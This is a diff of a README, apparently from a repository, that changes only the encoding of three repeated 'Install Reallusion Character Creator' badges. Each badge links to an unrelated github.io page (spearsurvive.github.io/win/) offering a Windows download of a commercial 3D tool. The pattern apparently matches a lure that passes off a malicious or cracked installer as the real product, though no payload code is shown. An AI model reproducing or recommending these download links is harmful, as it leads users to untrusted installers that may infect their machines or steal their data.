@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion%20Character%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion+Character+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Reallusion Character Creator is a 3D character design tool for creating photorea
 
 <div align="center">
 
-[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion%20Character%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion+Character+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Reallusion Character Creator is a 3D character design tool for creating photorea
 
 <div align="center">
 
-[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion%20Character%20Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Character Creator](https://img.shields.io/badge/⬇_Install_Reallusion+Character+Creator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
